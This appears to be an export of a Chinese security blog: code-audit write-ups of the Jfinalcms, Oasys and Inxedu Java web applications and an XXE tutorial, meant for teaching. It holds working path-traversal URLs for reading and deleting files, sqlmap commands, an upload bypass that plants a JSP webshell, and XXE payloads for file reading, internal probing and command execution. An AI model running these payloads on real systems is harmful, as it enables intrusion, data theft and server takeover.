","date":"2024-07-07","objectID":"/jfinalcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:4:0","tags":["代码审计","Java安全","渗透测试"],"title":"Jfinalcms代码审计","uri":"/jfinalcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"任意文件读取 可以搜索的关键字： org.apache.commons.io.FileUtils org.springframework.stereotype.Controller import java.nio.file.Files import java.nio.file.Path import java.nio.file.Paths import java.util.Scanner sun.nio.ch.FileChannelImpl java.io.File.list/listFiles java.io.FileInputStream java.io.FileOutputStream java.io.FileSystem/Win32FileSystem/WinNTFileSystem/UnixFileSystem sun.nio.fs.UnixFileSystemProvider/WindowsFileSystemProvider java.io.RandomAccessFile sun.nio.fs.CopyFile sun.nio.fs.UnixChannelFactory sun.nio.fs.WindowsChannelFactory java.nio.channels.AsynchronousFileChannel FileUtil/IOUtil BufferedReader readAllBytes scanner 漏洞点在后台：点击“编辑”的时候，响应会显示文件内容 这个漏洞点在com/cms/controller/admin/TemplateController.java中的edit方法： 如果目录directory为空的话，则默认就是要传入的文件名 /** * 编辑 */ public void edit() { String fileName = getPara(\"fileName\"); String directory = getPara(\"directory\"); if (StringUtils.isBlank(fileName)) { //filename不能为空 render(CommonAttribute.ADMIN_ERROR_VIEW); return; } setAttr(\"directory\", directory); setAttr(\"fileName\", fileName); String filePath = \"\"; if(StringUtils.isNotBlank(directory)){ // 目录directory为空和不为空是两种情况，如果目录不为空，则就是以那个目录开始寻找文件 filePath = \"/\"+directory.replaceAll(\",\", \"/\")+\"/\"+fileName; //把逗号替换为/,拼接为完整的路径 }else{ filePath = \"/\"+fileName; //如果目录directory为空的话，则默认就是要传入的文件名 } setAttr(\"content\", StringEscapeUtils.escapeHtml(TemplateUtils.read(filePath))); //读取 render(getView(\"template/edit\")); } Poc: # directory为空 http://192.168.3.214:8080/admin/template/edit?fileName=../../../../../../../../../../../../../../../../../../tmp/flag.txt # directory不为空 http://192.168.3.214:8080/admin/template/edit?fileName=../../../../../../../../../../../../../../../../../../tmp/flag.txt\u0026directory=default,static ","date":"2024-07-07","objectID":"/jfinalcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:5:0","tags":["代码审计","Java安全","渗透测试"],"title":"Jfinalcms代码审计","uri":"/jfinalcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"任意文件删除 都是admin/template接口中的，这个是delete 可以看到没有任何过滤，可以删除任意文件： 测试： http://192.168.3.214:8080/admin/template/delete?fileName=../../../../../../../../../../../../../../../../../../tmp/flag.txt 同理，update也一样 同理，/admin/template/save也一样 ","date":"2024-07-07","objectID":"/jfinalcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:6:0","tags":["代码审计","Java安全","渗透测试"],"title":"Jfinalcms代码审计","uri":"/jfinalcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"任意文件读取 http://192.168.3.214:8080/ajax/html?html=../../../../../../../../../../../../../../../../../../tmp/flag.txt 目录穿越 直接渲染读取: ","date":"2024-07-07","objectID":"/jfinalcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:7:0","tags":["代码审计","Java安全","渗透测试"],"title":"Jfinalcms代码审计","uri":"/jfinalcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"SSTI 待复现 ","date":"2024-07-07","objectID":"/jfinalcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:8:0","tags":["代码审计","Java安全","渗透测试"],"title":"Jfinalcms代码审计","uri":"/jfinalcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"简介 oasys是一个OA办公自动化系统，基于springboot框架开发，数据库使用了Mybatis，使用Maven进行管理的项目 源码下载：https://github.com/misstt123/oasys 因为该项目是基于SpringBoot系统所开发，所以只需要导入数据库即可 按照文档说明修改application.properties配置文件内容: Linux下图形验证码不显示问题：https://blog.csdn.net/weixin_52785994/article/details/127362166（tomcat的） 而springboot下如下修改： 对于application.properties： server.tomcat.additional-tld-skip-patterns=Djava.awt.headless=true 对于application.yml： server: tomcat: additional-tld-skip-patterns: Djava.awt.headless=true ","date":"2024-07-07","objectID":"/oasys%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:1:0","tags":["代码审计","Java"],"title":"Oasys系统代码审计","uri":"/oasys%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"SQL注入 由于使用了Mybatis，所以使用${搜索看是否有使用拼接并且没有进行过滤 这里发现多个，先从第一个开始看：看看过程中参数是否可控并且有无过滤 进于allDirector（按住ctrl加鼠标左键），继续跟进看谁调用了allDirector，发现是AddressMapper接口调用的allDirector方法。 继续向上寻找（ctrl+鼠标左键allDirector方法名）： 发现是在AddController.java文件中，参数值alph就是pinyin，发现pinyin参数可控并且没有防止SQL注入的防御措施，所以此处存在SQL注入： 接口地址为：/outaddresspaging 验证一下：有变化 数据包直接放到sqlmap中去跑一下： python sqlmap.py -r post.txt --batch --level 2 其他几个参数也是同样存在注入点的： ","date":"2024-07-07","objectID":"/oasys%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:2:0","tags":["代码审计","Java"],"title":"Oasys系统代码审计","uri":"/oasys%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"Mybatis注入的补充知识点 在Mybatis中， 占位符#{}：对传入的参数进行预编译转义处理。类似 JDBC 中的PreparedStatement。 拼接符${}：对传入的参数不做处理，直接拼接，进而会造成SQL注入漏洞。 但是存在三种不能使用#{}情况： ","date":"2024-07-07","objectID":"/oasys%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:3:0","tags":["代码审计","Java"],"title":"Oasys系统代码审计","uri":"/oasys%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"1.order by注入 与JDBC预编译中order by注入一样，在order by语句后面需要是字段名或者字段位置。因此不能使用Mybatis中预编译的方式。 所以，如果此时开发人员在使用order by语句的时候往往会存在注入，如下： 正确的使用order by的方式如下： // 当插入的数据用户可控时，应使用白名单处理 String orderBy = \"{user input}\"; String orderByField; switch (orderBy) { case \"name\": orderByField = \"name\";break; case \"age\": orderByField = \"age\"; break; default: orderByField = \"id\"; } ","date":"2024-07-07","objectID":"/oasys%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:3:1","tags":["代码审计","Java"],"title":"Oasys系统代码审计","uri":"/oasys%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"2.In注入 in 在查询某个范围数据是会用到多个参数(比如select * from xxx where x in(a,b,c,);)，在 Mybtis中如果直接使用占位符#{}进行查询会将这些参数看做一个整体，查询会报错。 因此很多开发人员可能会使用拼接符${}对参数进行查询(因为偷懒/不知道如何正确使用)，从而造成了SQL注入漏洞，如下： 在Mybatis中，正确的in查询的方式如下：使用foreach配合占位符#{}实现IN查询 \u003cselect id=\"select\" parameterType=\"java.util.List\" resultMap=\"BaseResultMap\"\u003e SELECT * FROM user WHERE name IN \u003cforeach collection=\"names\" item=\"name\" open=\"(\" close=\")\" separator=\",\"\u003e #{name} \u003c/foreach\u003e \u003c/select\u003e ","date":"2024-07-07","objectID":"/oasys%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:3:2","tags":["代码审计","Java"],"title":"Oasys系统代码审计","uri":"/oasys%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"3.like注入 使用like语句进行查询时如果使用占位符#{}查询时程序会报错，如下：select * from users where username like '%#{username}%' 此时，经验不足的开发人员可能会使用拼接符${}对参数进行查询，从而造成了SQL注入漏洞，如下：select * from users where username like '%${username}%' 正确的like查询的使用方式，如下。 SELECT * FROM users WHERE name like CONCAT(\"%\", #{name}, \"%\") ","date":"2024-07-07","objectID":"/oasys%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:3:3","tags":["代码审计","Java"],"title":"Oasys系统代码审计","uri":"/oasys%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"任意文件上传 可以先从前端系统中找上传点 也可以先从代码中搜索关键字（这里先搜索的） 搜索了fileupload:(这里是恰巧有这个接口) 这个接口中直接对前端获取的参数进行获取后没有过滤： burp抓包测试： 但是是看不到上传路径的，也不知道有无解析 同时也不能进行目录穿越 无果 ","date":"2024-07-07","objectID":"/oasys%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:4:0","tags":["代码审计","Java"],"title":"Oasys系统代码审计","uri":"/oasys%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"任意文件读取 这个直接参考的https://xz.aliyun.com/t/11993 直接复现一下吧 两个漏洞点一样： src/main/java/cn/gson/oasys/controller/user/UserpanelController.java src/main/java/cn/gson/oasys/controller/process/ProcedureController.java 代码大概意思是：首先通过getRequestURI方法获取当前访问的相对路径，然后如果路径中存在/show，则将该路径中的/show替换为空。接下来与rootpath拼接然后通过File打开文件后返回前端。 /** * 图片预览 * @param response * @param fileid */ @RequestMapping(\"show/**\") //表示匹配以 /show 为前缀的所有请求，其中 /** 表示任意路径 public void image(Model model, HttpServletResponse response, @SessionAttribute(\"userId\") Long userId, HttpServletRequest request) throws IOException { String startpath = new String(URLDecoder.decode(request.getRequestURI(), \"utf-8\")); //获取URI路径,并解码 String path = startpath.replace(\"/show\", \"\"); // 将/show替换为空，那么：..show/..show/..show/..show../666.txt 就会替换为../../../../666.txt File f = new File(rootpath, path); System.out.println(f.getAbsolutePath()); ServletOutputStream sos = response.getOutputStream(); //获取响应对象的输出流，用于向浏览器发送图片数据 FileInputStream input = new FileInputStream(f.getPath()); //创建了一个文件输入流，用于读取图片文件的内容 byte[] data = new byte[(int) f.length()]; IOUtils.readFully(input, data); // 读取文件，内容读取到字节数组中 // 将文件流输出到浏览器 IOUtils.write(data, sos); input.close(); sos.close(); } 所以，我们只需构造 /show../ 即可替换成 ../ ，最终实现任意文件读取漏洞 http://192.168.3.214/show//show..//show..//show..//show..//show..//show..//show..//show..//show..//show../tmp/flag.txt ","date":"2024-07-07","objectID":"/oasys%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:5:0","tags":["代码审计","Java"],"title":"Oasys系统代码审计","uri":"/oasys%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"XSS 漏洞位于部门管理-\u003e添加部门处： 可以看到没有过滤直接写入了数据库： 查看部门列表取出数据也没有进行过滤: 其他XSS很多 ","date":"2024-07-07","objectID":"/oasys%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:6:0","tags":["代码审计","Java"],"title":"Oasys系统代码审计","uri":"/oasys%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"CSRF ","date":"2024-07-07","objectID":"/oasys%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:7:0","tags":["代码审计","Java"],"title":"Oasys系统代码审计","uri":"/oasys%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"越权","date":"2024-07-07","objectID":"/oasys%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:8:0","tags":["代码审计","Java"],"title":"Oasys系统代码审计","uri":"/oasys%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"项目简介 因酷开源网校系统是由北京因酷时代科技有限公司以下简称（因酷教育软件）研发并推出的国内首家Java版开源网校源代码建站系统，并免费提供给非商业用途用户使用，是用户体验最好、运营功能最全、性价比最高的在线教育软件。 该项目是SSM框架 项目部署： 1.配置数据库(这里我弄的时候存在一个问题：由于Linux系统对大小写敏感，所以如果在类Unix系统上部署环境，代码中数据库中数据表的大小写会影响，建议将代码中数据表的名字都统一修改为小写) 2.配置tomcat 前台账户密码： lmx193@163.com 111111 后台账户密码： admin 111111 web.xml：程序启动时tomcat会首先加载web.xml中的配置 。通过web.xml完成DispathcheServlet的声明，并将我们的请求转发到springmvc中。我们可以首先查看web.xml中是否配置了全局过滤器。判断是否能够bypass。 applicationContext.xml是spring核心配置文件,这里会加载一些其他的配置文件。 sping-mvc.xml文件中主要的工作是：启动注解、扫描controller包注解；静态资源映射；视图解析（defaultViewResolver）；文件上传（multipartResolver）;返回消息json配置。 ","date":"2024-07-06","objectID":"/inxedu%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:1:0","tags":["代码审计","Java"],"title":"Inxedu系统代码审计","uri":"/inxedu%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"pom.xml 审计一套系统，可以先看看pom.xml中加载了那些组件 ，如果这些组件中本身存在漏洞，就可以直接利用这些漏洞。 ","date":"2024-07-06","objectID":"/inxedu%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:2:0","tags":["代码审计","Java"],"title":"Inxedu系统代码审计","uri":"/inxedu%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"思路 以文件上传为例，先黑盒寻找并测试文件上传功能点，抓包得到对应路由等信息，从而定位到功能实现的具体代码（代码溯源），正向然后审计其是否存在漏洞。 通过关键字搜索关于上传功能的代码，查看是否存在漏洞，如果存在则反向追踪代码，找到路由 关于 1 day也是类似的思路，通过网上爆出的路由或者payload（或者通过看comment）来在代码中整体搜索定位漏洞点，然后逆向追踪 ","date":"2024-07-06","objectID":"/inxedu%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:3:0","tags":["代码审计","Java"],"title":"Inxedu系统代码审计","uri":"/inxedu%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"前台文件上传 这里正向追踪：先黑盒寻找上传文件的接口/功能点 —\u003eburp抓包找到接口地址—\u003e然后去代码中寻找(全局搜索/controller层找) 登录学员账号，寻找上传点，发现头像上传功能，测试： 看到请求地址为： 去代码中搜索image/jok4，没搜到： 没搜到原因有几种： 搜索时候注意：比如image/gok4这种两个路径可能是拼接起来的(比如controller的类有一个路径+方法上也有路径)，所以可以分开去搜image，gok4 这个项目中，这个路径是引入的自己打包的第三方jar包中代码中的，IDEA的搜索是无法搜索jar包里面关键字的（实际审计中，可以使用工具进行扫描有无关键字）。实际上这个项目是将处理文件上传的代码封装到了一个 Jar 包然后引用的，一般情况下如果碰到搜不到的情况，就去 pom.xml 里看看有没有声明依赖的 Jar 包 note:找到代码中接口后（如果看不懂是干啥的，可以结合数据包判断是干啥的功能） 我们定位到了代码位置： 然后继续正向往下分析代码，依次看controller层–\u003eservice层–\u003edao层—\u003emapper文件 可以定位到gok4方法： 该方法的逻辑如下： 1、检查上传文件的大小，如果超过4M，则返回错误信息。 //---\u003euploadfile参数为前端传递的文件 2、根据fileType参数判断文件后缀(使用getSuffix方法)是否符合要求，如果文件类型不符合或者后缀为jsp，则返回错误信息。 //---\u003efileType参数为前端传递 3、根据上传文件的后缀和param参数，确定上传文件的保存路径。 //---\u003eparam参数为前端传递 4、创建保存文件的目录（如果目录不存在）。 5、将上传文件保存到指定的路径(通过transferTo())。 6、返回上传成功的响应信息，包括文件路径和状态码。 7、如果发生异常，记录错误日志，并返回上传失败的错误信息。 跟进getSuffix中，发现其代码中除了获取文件后缀其他没什么过滤： public static String getSuffix(String str) { return str.substring(str.lastIndexOf(\".\") + 1); } } 再结合之前抓包的url：http://127.0.0.1:8080/image/gok4?\u0026param=temp\u0026fileType=jpg,gif,png,jpeg 将已知的信息串联起来，总结这段代码的判断逻辑为：文件后缀包含 jpg,gif,png,jpeg，且不为 jsp 即进行下一步上传操作。 可以看到param和fileType为代码中我们可控的 我们的思路： 上传一个不是jsp的且可以解析的，比如jspx，即http://127.0.0.1:8080/image/gok4?\u0026param=temp\u0026fileType=jpg,gif,png,jpeg,jspx 利用windows的特性，比如::$DATA，即http://127.0.0.1:8080/image/gok4?\u0026param=temp\u0026fileType=jpg,gif,png,jpeg,jsp$$DATA 我们使用冰蝎自带的jsp测试： 成功上传： ","date":"2024-07-06","objectID":"/inxedu%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:4:0","tags":["代码审计","Java"],"title":"Inxedu系统代码审计","uri":"/inxedu%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"后台文件上传 逆向追踪：先通过\"在文件中查找\"来搜索文件上传功能的关键字（搜索时候后缀限制为.java），然后反向回溯功能点 文件上传关键字： File java.io.File FileUpload FileUploadBase FileItemIteratorImpl FileItemStreamImpl FileUtils UploadHandleServlet FileLoadServlet FileOutputStream DiskFileItemFactory MultipartRequestEntity MultipartFile com.oreilly.servlet.MultipartRequest MultipartHttpServletRequest org.apache.commons.fileupload MultipartFile CommonsMultipartResolver ...... 我们搜索FileUpload， 位置com/inxedu/os/common/controller/VideoUploadController.java 看起来是一个视频上传的功能： 可以直接上传jsp 我们回溯功能点在哪里（好了，它在controller里面，不用回溯了） 可知该上传接口为：/video/uploadvideo 构造： 方法1： 找到该接口在系统中对应的位置 方法2：自己构造文件上传的表单(接口改为该接口即可)(简便) 构造表单： \u003cform action=\"http://192.168.3.214:8080/video/uploadvideo\" enctype=\"multipart/form-data\" id=\"frmUpload\" method=\"post\"\u003e \u003cinput name=\"uploadfile\" type=\"file\"\u003e \u003cinput type =\"text\" name = \"fileType\" value=\"\"\u003e \u003cinput id=\"btnUpload\" type=\"submit\" value=\"上传\"\u003e \u003c/form\u003e 抓包修改 我这里测试一直失败报服务器错误，可能是环境搭建的问题，先不管了 note：解决IDEA下debug断点进不去： https://blog.csdn.net/xujie102360/article/details/81476774 https://blog.csdn.net/searlas/article/details/80826777 ","date":"2024-07-06","objectID":"/inxedu%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:5:0","tags":["代码审计","Java"],"title":"Inxedu系统代码审计","uri":"/inxedu%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"SQL注入 已知系统使用的是mybatis，mybatis最常见的注入就是错误使用${}导致， 所以我们直接搜索${，看看哪些是通过${}取值并且没有过滤的 找到了一处，我们逆向追踪调用逻辑，寻找是否含有过滤并且参数我们是否可控。 daoImpl: dao: ctrl+单击，来到ServiceImpl: 参数为ids，由形参articleIds而来 也没有进行过滤 service： 往上走去找controller：传递的参数为artidArr，也确实没有过滤 deleteArticle方法在这里被调用：参数为前端传来的articelId，我们可控： 可知接口为：/admin/article/delete 打开系统登录后台。找到文章管理部分，选择删除，抓包 直接将数据包放到sqlmap中跑： 可以看到这套系统中还有多处存在SQL注入漏洞： ","date":"2024-07-06","objectID":"/inxedu%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:6:0","tags":["代码审计","Java"],"title":"Inxedu系统代码审计","uri":"/inxedu%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"XSS 待完成 ","date":"2024-07-06","objectID":"/inxedu%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:7:0","tags":["代码审计","Java"],"title":"Inxedu系统代码审计","uri":"/inxedu%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"越权漏洞 待完成 ","date":"2024-07-06","objectID":"/inxedu%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:8:0","tags":["代码审计","Java"],"title":"Inxedu系统代码审计","uri":"/inxedu%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["渗透测试"],"content":" 虽然然XXE漏洞很基础，但是很久不用掌握的也不太好，所以借此机会重新复习一下 ","date":"2024-07-05","objectID":"/xxe%E6%BC%8F%E6%B4%9E/:0:0","tags":["XXS","java安全","代码审计","渗透测试"],"title":"XXE漏洞","uri":"/xxe%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"XML XML全称“可扩展标记语言”（extensible markup language），XML是一种用于存储和传输数据的语言。它用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，…），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML， XACML，…）与HTML一样，XML使用标签和数据的树状结构。但不同的是，XML不使用预定义标记，因此可以为标记指定描述数据的名称。由于json的出现，xml的受欢迎程度大大下降。 XML文档结构 包括：XML声明+DTD文档类型定义+文档元素，例如： \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e //xml的声明 \u003c!DOCTYPE foo [ \u003c!ELEMENT foo ANY \u003e \u003c!ENTITY xxe SYSTEM \"file://d:/1.txt\" \u003e ]\u003e //DTD部分 \u003cx\u003e\u0026xxe;\u003c/x\u003e //xml文档部分 DTD XML 文档有自己的一个格式规范，这个格式规范就是DTD（document type definition）即文档类型定义，用于定义XML文档的结构，它作为xml文件的一部分位于XML声明和文档元素之间，比如： \u003c?xml version=\"1.0\"?\u003e//这一行是 XML 文档定义 \u003c!DOCTYPE message [ \u003c!ELEMENT message (receiver ,sender ,header ,msg)\u003e \u003c!ELEMENT receiver (#PCDATA)\u003e \u003c!ELEMENT sender (#PCDATA)\u003e \u003c!ELEMENT header (#PCDATA)\u003e \u003c!ELEMENT msg (#PCDATA)\u003e 它就定义了 XML 的根元素必须是message，根元素下面有一些子元素，所以 XML必须像下面这么写： \u003cmessage\u003e \u003creceiver\u003eMyself\u003c/receiver\u003e \u003csender\u003eSomeone\u003c/sender\u003e \u003cheader\u003eTheReminder\u003c/header\u003e \u003cmsg\u003eThis is an amazing book\u003c/msg\u003e \u003c/message\u003e DTD需要在!DOCTYPE注释中定义根元素，而后在中括号的[]内使用！ELEMENT注释定义各元素特征。 实体 如： \u003c?xml version = \"1.0\"?\u003e \u003c!DOCTYPE fool [ \u003c!ELEMENT fool ANY\u003e \u003c!ENTITY xxe \"test\"\u003e ]\u003e 它规定了xml文件的根元素是foo，但ANY说明接受任何元素。重点是!ENTITY，这就是我们要提到的实体，实体本质是定义了一个变量，变量名xxe，值为“test”，后面在 XML 中通过 \u0026 符号进行引用，所以根据DTD我们写出下面的xml文件： \u003clogin\u003e \u003cuser\u003e\u0026xxe/user\u003e \u003cpass\u003e\u003c/pass\u003e \u003c/login\u003e 因为ANY的属性，元素我们可以随意命令，但user值通过\u0026xxe，实际值为test。 我们使用 \u0026xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 \u0026xxe 就会被 \"test\" 替换。 重点来了，实体分为两种，内部实体和外部实体 1.内部实体 上面的例子就是内部实体。 2.外部实体 但是实体实际上可以从外部的dtd文件中引用 XML外部实体是一种自定义实体，定义位于声明它们的DTD之外，声明使用SYSTEM关键字，比如： \u003c?xml version=\"1.0\" encoding=\"ISO-8859-1\"?\u003e \u003c!DOCTYPE foo [ \u003c!ELEMENT foo ANY \u003e \u003c!ENTITY xxe SYSTEM \"file:///c:/test.dtd\" \u003e]\u003e \u003ccreds\u003e \u003cuser\u003e\u0026xxe;\u003c/user\u003e \u003cpass\u003emypass\u003c/pass\u003e \u003c/creds\u003e 还有一种引用方式是引用公用 DTD 的方法，语法如下： \u003c!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”\u003e 这个在我们的攻击中也可以起到和 SYSTEM 一样的作用 上面已经将实体分成了两个派别（内部实体和外部外部），但从另一个角度看，实体也可以分成两个派别（通用实体和参数实体） 1.通用实体 用 \u0026实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用 \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE updateProfile [\u003c!ENTITY file SYSTEM \"file:///c:/windows/win.ini\"\u003e ]\u003e \u003cupdateProfile\u003e \u003cfirstname\u003eJoe\u003c/firstname\u003e \u003clastname\u003e\u0026file;\u003c/lastname\u003e ... \u003c/updateProfile\u003e 2.参数实体 (1) 使用 % 实体名(这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用 %实体名; 引用 (2) 只有在 DTD 文件中，参数实体的声明才能引用其他实体 (3) 和通用实体一样，参数实体也可以外部引用 \u003c!ENTITY % an-element \"\u003c!ELEMENT mytag (subtag)\u003e\"\u003e \u003c!ENTITY % remote-dtd SYSTEM \"http://somewhere.example.org/remote.dtd\"\u003e %an-element; %remote-dtd; 参数实体在Blind XXE 中起到了至关重要的作用 ","date":"2024-07-05","objectID":"/xxe%E6%BC%8F%E6%B4%9E/:1:0","tags":["XXS","java安全","代码审计","渗透测试"],"title":"XXE漏洞","uri":"/xxe%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"XXE简介 XML外部实体注入漏洞也叫作XXE（XML External Entity）漏洞，是一种常见的Web应用安全漏洞，可能导致敏感信息泄露、远程代码执行等安全问题。 当应用程序使用XML处理器解析外部XML实体时，可能会发生XXE漏洞。 外部XML实体是指定义在XML文档外部的实体，它可以引用外部文件或资源。如果XML处理器没有正确配置，它可能会解析这些外部实体，并将外部文件或资源的内容包含到XML文档中。 那么，前面说的外部实体究竟能干什么？ ","date":"2024-07-05","objectID":"/xxe%E6%BC%8F%E6%B4%9E/:2:0","tags":["XXS","java安全","代码审计","渗透测试"],"title":"XXE漏洞","uri":"/xxe%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"XXE危害 根据有无回显可分为有回显XXE和Blind XXE 危害： 任意文件读取 有回显读取本地文件（normal XXE） 无回显读取本地文件（Blind OOB XXE，数据外带） 内网探测：如 \u003c!ENTITY xxe SYSTEM \"http://127.0.0.1:8080\" \u003e探测端口； HTTP内网主机探测 内网端口探测 攻击内网站点 文件上传(使用jar://) 命令执行：\u003c!ENTITY xxe SYSTEM \"expect://id\" \u003e执行命令； DOS攻击 ……. ","date":"2024-07-05","objectID":"/xxe%E6%BC%8F%E6%B4%9E/:3:0","tags":["XXS","java安全","代码审计","渗透测试"],"title":"XXE漏洞","uri":"/xxe%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"漏洞验证思路 关注可能解析xml格式数据的功能处，较容易发现的是请求包参数包含XML格式数据，不容易发现的是文件上传及数据解析功能处，通过改请求方式、请求头Content-Type等方式进行挖掘。 步骤： 1.检测XML是否会被成功解析以及是否支持DTD引用外部实体 使用如下xml内容(主要添加了DTD即DOCTYPE)： \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE foo\u003e \u003cuser\u003e \u003cname\u003eMi1k7ea\u003c/name\u003e \u003csex\u003emale\u003c/sex\u003e \u003cage\u003e20\u003c/age\u003e \u003c/user\u003e 注意：当进行的是黑盒测试时，未返回Error不代表就是可以解析XML，但返回Error就肯定是不支持解析该XML，原因是服务端可能对Error进行了封装 2.测试是否支持解析普通实体 修改xml内容如下，主要添加ELEMENT： \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE foo [ \u003c!ELEMENT foo EMPTY\u003e ]\u003e \u003cuser\u003e \u003cname\u003eMi1k7ea\u003c/name\u003e \u003csex\u003emale\u003c/sex\u003e \u003cage\u003e20\u003c/age\u003e \u003c/user\u003e 发现可以正常解析。 3.测试是否支持解析参数实体 修改xml内容如下，主要修改ELEMENT为ENTITY实体： \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE foo [ \u003c!ENTITY foo \"Entity can be hacked\"\u003e ]\u003e \u003cuser\u003e \u003cname\u003eMi1k7ea\u003c/name\u003e \u003csex\u003e\u0026foo;\u003c/sex\u003e \u003cage\u003e20\u003c/age\u003e \u003c/user\u003e 可正常解析，且成功进行了XML实体注入 4.测试是否支持解析外部实体： 修改xml内容如下，主要修改为SYSTEM执行访问外部链接： \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE foo SYSTEM \"http://192.168.17.111:8000/1.dtd\"\u003e 